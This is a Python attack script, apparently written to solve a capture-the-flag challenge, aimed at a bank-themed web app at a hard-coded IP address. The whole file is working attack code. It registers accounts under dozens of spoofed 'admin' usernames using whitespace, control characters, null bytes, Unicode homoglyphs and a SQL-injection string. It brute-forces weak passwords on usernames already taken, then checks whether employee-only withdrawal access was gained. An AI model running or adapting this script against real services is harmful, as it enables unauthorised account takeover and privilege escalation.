import urllib.request, urllib.parse, http.cookiejar, re, time

BASE = "http://103.163.47.230:33663"


def sess():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", "Mozilla/5.0")]
    return op, cj


def req(op, p, data=None, method=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    h = {"Content-Type": "application/x-www-form-urlencoded"} if body else {}
    r = urllib.request.Request(BASE + p, data=body, headers=h, method=method)
    try:
        resp = op.open(r, timeout=20)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    b = re.sub(r"<[^>]+>", " ", b)
    return re.sub(r"\s+", " ", b).strip()


CAND = [
    "admin", "Admin", "ADMIN", "admin ", "admin  ", "admin_", "admin__",
    "admin\t", "admin\n", "admin\r", "admin\x0b", "admin\x0c",
    "admin\u00a0", "admin\u2000", "admin\u2028", "admin\u2029", "admin\u3000",
    "admin\u200b", "admin\ufeff", "admin\u200d", "admin\u180e",
    "ａｄｍｉｎ", "admın", "аdmin", "admin.", "admin-", " admin",
    "admin\x00", "\x00admin", "admin", "admin'or'1", "root", "staff",
    "employee", "teller", "banker", "operator", "manager", "admin1",
]

for u in CAND:
    op, cj = sess()
    pw = "pw123456"
    s, b = req(op, "/register", {"username": u, "password": pw}, "POST")
    if "已被占用" in b:
        # 尝试用常见弱口令登录
        for guess in ["admin", "admin123", "123456", "password", "pw123456", "admin888"]:
            op2, _ = sess()
            s2, b2 = req(op2, "/login", {"username": u, "password": guess}, "POST")
            if "我的账户" in b2:
                s3, b3 = req(op2, "/withdraw", {}, "POST")
                t3 = clean(b3)
                emp = "仅对本行内部员工开放" not in t3
                print(f"[EXISTING] {u!r:16s} pwd={guess!r:12s} withdraw={t3[:80]} {'<<EMPLOYEE!' if emp else ''}")
                break
        else:
            print(f"[TAKEN   ] {u!r:16s} (no weak pwd)")
        continue
    s, b = req(op, "/login", {"username": u, "password": pw}, "POST")
    if "我的账户" not in b:
        print(f"[LOGINFAIL] {u!r:16s} {clean(b)[:70]}")
        continue
    s2, b2 = req(op, "/withdraw", {}, "POST")
    t2 = clean(b2)
    emp = "仅对本行内部员工开放" not in t2
    dep = re.search(r"(\d+) 存款余额", t2)
    cash = re.search(r"(\d+) 现金金币", t2)
    print(f"[NEW     ] {u!r:16s} dep={dep.group(1) if dep else '?':>8s} cash={cash.group(1) if cash else '?':>6s} "
          f"{'<== EMPLOYEE!!' if emp else ''} {t2[:100]}")
